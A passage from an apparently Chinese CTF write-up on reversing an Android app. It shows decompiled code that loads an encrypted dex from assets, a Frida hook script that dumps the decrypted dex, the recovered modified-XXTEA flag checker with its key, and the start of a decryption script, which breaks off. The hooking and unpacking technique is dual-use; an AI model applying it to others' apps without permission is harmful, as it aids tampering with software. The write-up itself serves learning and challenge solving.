function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        <span class="type">ActivityMainBinding</span> <span class="variable">inflate</span> <span class="operator">=</span> ActivityMainBinding.inflate(getLayoutInflater());</span><br><span class="line">        <span class="built_in">this</span>.binding = inflate;</span><br><span class="line">        setContentView(inflate.getRoot());</span><br><span class="line">        <span class="type">byte</span>[] dBytes = LoadData(<span class="string">&quot;TMP&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] dBytes2 = change(dBytes);</span><br><span class="line">        <span class="type">InMemoryDexClassLoader</span> <span class="variable">dexClassLoader</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (Build.VERSION.SDK_INT &gt;= <span class="number">29</span>) &#123;</span><br><span class="line">            ByteBuffer[] byteBuffers = &#123;ByteBuffer.wrap(dBytes2)&#125;;</span><br><span class="line">            <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> getApplicationInfo().nativeLibraryDir;</span><br><span class="line">            <span class="type">String</span> <span class="variable">library</span> <span class="operator">=</span> ((PathClassLoader) getClassLoader()).findLibrary(<span class="string">&quot;myapplication&quot;</span>);</span><br><span class="line">            dexClassLoader = <span class="keyword">new</span> <span class="title class_">InMemoryDexClassLoader</span>(byteBuffers, <span class="keyword">new</span> <span class="title class_">File</span>(library).getParent(), getClassLoader().getParent());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">Class</span> <span class="variable">flagCheckerClass</span> <span class="operator">=</span> dexClassLoader.loadClass(<span class="string">&quot;com.example.myapplication.FlagChecker&quot;</span>);</span><br><span class="line">            <span class="keyword">final</span> <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> flagCheckerClass.getMethod(<span class="string">&quot;check&quot;</span>, String.class);</span><br><span class="line">            <span class="type">Button</span> <span class="variable">button</span> <span class="operator">=</span> (Button) findViewById(R.id.button);</span><br><span class="line">            button.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123; <span class="comment">// from class: ctf.myapplication.MainActivity$$ExternalSyntheticLambda0</span></span><br><span class="line">                <span class="meta">@Override</span> <span class="comment">// android.view.View.OnClickListener</span></span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View view)</span> &#123;</span><br><span class="line">MainActivity.<span class="built_in">this</span>.m92lambda$onCreate$<span class="number">0</span>$ctfmyapplicationMainActivity(method, flagCheckerClass, view);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException | NoSuchMethodException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* JADX INFO: Access modifiers changed from: package-private */</span></span><br><span class="line">    <span class="comment">/* renamed from: lambda$onCreate$0$ctf-myapplication-MainActivity, reason: not valid java name */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="comment">/* synthetic */</span> <span class="keyword">void</span> m92lambda$onCreate$<span class="number">0</span>$ctfmyapplicationMainActivity(Method finalMethod, Class finalFlagCheckerClass, View v) &#123;</span><br><span class="line">        <span class="type">TextView</span> <span class="variable">textView</span> <span class="operator">=</span> (TextView) findViewById(R.id.editTextText);</span><br><span class="line">        <span class="type">String</span> <span class="variable">flag</span> <span class="operator">=</span> textView.getText().toString();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Boolean</span> <span class="variable">res</span> <span class="operator">=</span> (Boolean) finalMethod.invoke(finalFlagCheckerClass.newInstance(), flag);</span><br><span class="line">            <span class="keyword">if</span> (res == <span class="literal">null</span> || !res.booleanValue()) &#123;</span><br><span class="line">                Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;No&quot;</span>, <span class="number">1</span>).show();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;Yes&quot;</span>, <span class="number">1</span>).show();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException | InstantiationException | InvocationTargetException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] LoadData(String inFile) &#123;</span><br><span class="line">        <span class="type">byte</span>[] buffer = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">stream</span> <span class="operator">=</span> getAssets().open(inFile);</span><br><span class="line">            <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> stream.available();</span><br><span class="line">            buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[size];</span><br><span class="line">            stream.read(buffer);</span><br><span class="line">            stream.close();</span><br><span class="line">            <span class="keyword">return</span> buffer;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">return</span> buffer;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发现有一个TMP文件在运行过程中被解密，并作为dex读取，用frida动态转储：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">on_message</span>(<span class="params">message, data</span>):</span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;send&#x27;</span>:</span><br><span class="line">        payload = message[<span class="string">&#x27;payload&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> payload.get(<span class="string">&#x27;type&#x27;</span>) == <span class="string">&#x27;dex_content&#x27;</span>:</span><br><span class="line">            <span class="comment"># 将十六进制字符串数组转换为实际的字节数组</span></span><br><span class="line">            hex_array = payload.get(<span class="string">&#x27;content&#x27;</span>)</span><br><span class="line">            dex_content = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;&#x27;</span>.join(hex_array))</span><br><span class="line">            output_path = <span class="string">&quot;E:/CTF/output.dex&quot;</span></span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(output_path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(dex_content)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Dex dumped to <span class="subst">&#123;os.path.abspath(output_path)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># JavaScript注入代码</span></span><br><span class="line">jscode = <span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Starting hook...&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Hook MainActivity.change方法</span></span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">MainActivity</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;ctf.myapplication.MainActivity&#x27;</span>);</span><br><span class="line">    <span class="title class_">MainActivity</span>.<span class="property">change</span>.<span class="title function_">overload</span>(<span class="string">&#x27;[B&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">bArr</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;MainActivity.change method called with byte array of length: &quot;</span> + bArr.<span class="property">length</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用原始的change方法获取处理后的byte数组</span></span><br><span class="line">        <span class="keyword">var</span> resultByteArray = <span class="variable language_">this</span>.<span class="title function_">change</span>(bArr);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Processed byte array length: &quot;</span> + resultByteArray.<span class="property">length</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 发送提取到的dex内容</span></span><br><span class="line">        <span class="title function_">send</span>(&#123;<span class="attr">type</span>: <span class="string">&quot;dex_content&quot;</span>, <span class="attr">content</span>: <span class="title function_">bytesToHexArray</span>(resultByteArray)&#125;);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> resultByteArray;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Hook setup complete.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 辅助函数：将byte数组转换为hex字符串数组</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">bytesToHexArray</span>(<span class="params">bytes</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> hexArray = [];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; bytes.<span class="property">length</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">var</span> hex = (<span class="string">&#x27;0&#x27;</span> + (bytes[i] &amp; <span class="number">0xFF</span>).<span class="title function_">toString</span>(<span class="number">16</span>)).<span class="title function_">slice</span>(-<span class="number">2</span>);</span><br><span class="line">            hexArray.<span class="title function_">push</span>(hex);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> hexArray;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">target_process</span>):</span><br><span class="line">    <span class="comment"># 通过包名启动并附加到应用</span></span><br><span class="line">    device = frida.get_usb_device()</span><br><span class="line">    pid = device.spawn([target_process])</span><br><span class="line">    session = device.attach(pid)</span><br><span class="line"></span><br><span class="line">    script = session.create_script(jscode)</span><br><span class="line">    script.on(<span class="string">&#x27;message&#x27;</span>, on_message)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[*] Attaching from the process.&#x27;</span>)</span><br><span class="line">    script.load()</span><br><span class="line">    <span class="comment"># 继续应用的执行</span></span><br><span class="line">    device.resume(pid)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sys.stdin.read()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Detaching from the process.&quot;</span>)</span><br><span class="line">        session.detach()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        process = frida.get_usb_device(-<span class="number">1</span>).enumerate_processes()</span><br><span class="line">        <span class="built_in">print</span>(process)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Usage: python dump_dex.py &lt;package_name&gt;&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    target_process = sys.argv[<span class="number">1</span>]</span><br><span class="line">    main(target_process)</span><br></pre></td></tr></table></figure>
<p>得到函数：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.myapplication;</span><br><span class="line"><span class="keyword">import</span> java.io.UnsupportedEncodingException;</span><br><span class="line"><span class="comment">/* loaded from: E:\CTF\output.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">FlagChecker</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="comment">/* synthetic */</span> <span class="type">boolean</span> <span class="variable">$assertionsDisabled</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">DELTA</span> <span class="operator">=</span> -<span class="number">1640531527</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> String <span class="title function_">getKey</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;ctf&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">MX</span><span class="params">(<span class="type">int</span> sum, <span class="type">int</span> y, <span class="type">int</span> z, <span class="type">int</span> p, <span class="type">int</span> e, <span class="type">int</span>[] k)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> (((z &gt;&gt;&gt; <span class="number">5</span>) ^ (y &lt;&lt; <span class="number">2</span>)) + ((y &gt;&gt;&gt; <span class="number">3</span>) ^ (z &lt;&lt; <span class="number">4</span>))) ^ ((sum ^ y) + (k[(p &amp; <span class="number">3</span>) ^ e] ^ z));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">byte</span>[] encrypt(<span class="type">byte</span>[] data, <span class="type">byte</span>[] key) &#123;</span><br><span class="line">        <span class="keyword">if</span> (data.length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> data;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> toByteArray(encrypt(toIntArray(data, <span class="literal">true</span>), toIntArray(fixKey(key), $assertionsDisabled)), $assertionsDisabled);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">byte</span>[] encrypt(String data, String key) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> encrypt(data.getBytes(<span class="string">&quot;UTF-8&quot;</span>), key.getBytes(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnsupportedEncodingException e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String <span class="title function_">encryptToBase64String</span><span class="params">(String data, String key)</span> &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = encrypt(data, key);</span><br><span class="line">        <span class="keyword">if</span> (bytes == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Base64.encode(bytes);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span>[] encrypt(<span class="type">int</span>[] v, <span class="type">int</span>[] k) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> v.length - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (n &lt; <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> v;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">e</span> <span class="operator">=</span> (<span class="number">52</span> / (n + <span class="number">1</span>)) + <span class="number">6</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">z</span> <span class="operator">=</span> v[n];</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">q</span> <span class="operator">=</span> e - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (e &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> v;</span><br><span class="line">            &#125;</span><br><span class="line">            sum += DELTA;</span><br><span class="line">            <span class="type">int</span> <span class="variable">e2</span> <span class="operator">=</span> (sum &gt;&gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="type">int</span> <span class="variable">p</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> (p &lt; n) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">MX</span> <span class="operator">=</span> v[p] + MX(sum, v[p + <span class="number">1</span>], z, p, e2, k);</span><br><span class="line">                v[p] = MX;</span><br><span class="line">                z = MX;</span><br><span class="line">                p++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">int</span> <span class="variable">MX2</span> <span class="operator">=</span> v[n] + MX(sum, v[<span class="number">0</span>], z, p, e2, k);</span><br><span class="line">            v[n] = MX2;</span><br><span class="line">            z = MX2;</span><br><span class="line">            e = q;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] fixKey(<span class="type">byte</span>[] key) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key.length == <span class="number">16</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> key;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">byte</span>[] fixedkey = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">16</span>];</span><br><span class="line">        <span class="keyword">if</span> (key.length &lt; <span class="number">16</span>) &#123;</span><br><span class="line">            System.arraycopy(key, <span class="number">0</span>, fixedkey, <span class="number">0</span>, key.length);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.arraycopy(key, <span class="number">0</span>, fixedkey, <span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> fixedkey;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span>[] toIntArray(<span class="type">byte</span>[] data, <span class="type">boolean</span> includeLength) &#123;</span><br><span class="line">        <span class="type">int</span>[] result;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> (data.length &amp; <span class="number">3</span>) == <span class="number">0</span> ? data.length &gt;&gt;&gt; <span class="number">2</span> : (data.length &gt;&gt;&gt; <span class="number">2</span>) + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (includeLength) &#123;</span><br><span class="line">            result = <span class="keyword">new</span> <span class="title class_">int</span>[n + <span class="number">1</span>];</span><br><span class="line">            result[n] = data.length;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            result = <span class="keyword">new</span> <span class="title class_">int</span>[n];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n2</span> <span class="operator">=</span> data.length;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n2; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> i &gt;&gt;&gt; <span class="number">2</span>;</span><br><span class="line">            result[i2] = result[i2] | ((data[i] &amp; <span class="number">255</span>) &lt;&lt; ((i &amp; <span class="number">3</span>) &lt;&lt; <span class="number">3</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* JADX INFO: Multiple debug info for r1v0 byte[]: [D(&#x27;m&#x27; int), D(&#x27;result&#x27; byte[])] */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] toByteArray(<span class="type">int</span>[] data, <span class="type">boolean</span> includeLength) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> data.length &lt;&lt; <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (includeLength) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> data[data.length - <span class="number">1</span>];</span><br><span class="line">            <span class="type">int</span> <span class="variable">n2</span> <span class="operator">=</span> n - <span class="number">4</span>;</span><br><span class="line">            <span class="keyword">if</span> (m &lt; n2 - <span class="number">3</span> || m &gt; n2) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            n = m;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">byte</span>[] result = <span class="keyword">new</span> <span class="title class_">byte</span>[n];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            result[i] = (<span class="type">byte</span>) (data[i &gt;&gt;&gt; <span class="number">2</span>] &gt;&gt;&gt; ((i &amp; <span class="number">3</span>) &lt;&lt; <span class="number">3</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">check</span><span class="params">(String flag)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">enc</span> <span class="operator">=</span> encryptToBase64String(flag, getKey());</span><br><span class="line">        <span class="keyword">if</span> (enc != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> enc.equals(<span class="string">&quot;YYCKLWlSJ9x4lYVm7iqlHt/EXvgahEoKEe2dl0BnRmGhNQ9KhPXYef3Eqbg=&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AssertionError</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发现了一个魔改XXTEA加密和一个base64编码，密钥是从libctf的本地库中生成的，而本地库的该函数则显示BUG，直接动态调试dex得到密钥<font color=red><strong>882059e204adefc5</strong></font>，编写脚本解密：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">bytes_to_dwords_little_endian</span>(<span class="params">byte_array</span>):</span><br><span class="line">    <span class="keyword">return</span> [<span class="built_in">int</span>.from_bytes(byte_array[i:i+<span class="number">4</span>], byteorder=<span class="string">&#x27;little&#x27;</span>, signed=<span class="literal">False</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(byte_array), <span class="number">4</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dwords_to_bytes_little_endian</span>(<span class="params">dword_array</span>):</span><br><span class="line">    byte_list = []</span><br><span class="line">    <span class="keyword">for</span> dword <span class="keyword">in</span> dword_array:</span><br><span class="line">        byte_list.extend(dword.to_bytes(<span class="number">4</span>, byteorder=<span class="string">&#x27;little&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> byte_list</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">XXTEA</span>(<span class="params">m, leng, k</span>):</span><br><span class="line">    n = leng - <span class="number">1</span></span><br><span class="line">    delta = <span class="number">0x9E3779B9</span></span><br><span class="line">    rounds = <span class="number">6</span> + <span class="number">52</span> // (n + <span class="number">1</span>)</span><br><span class="line">    ttl = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(rounds):</span><br><span class="line">        ttl = (ttl + delta) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        <span 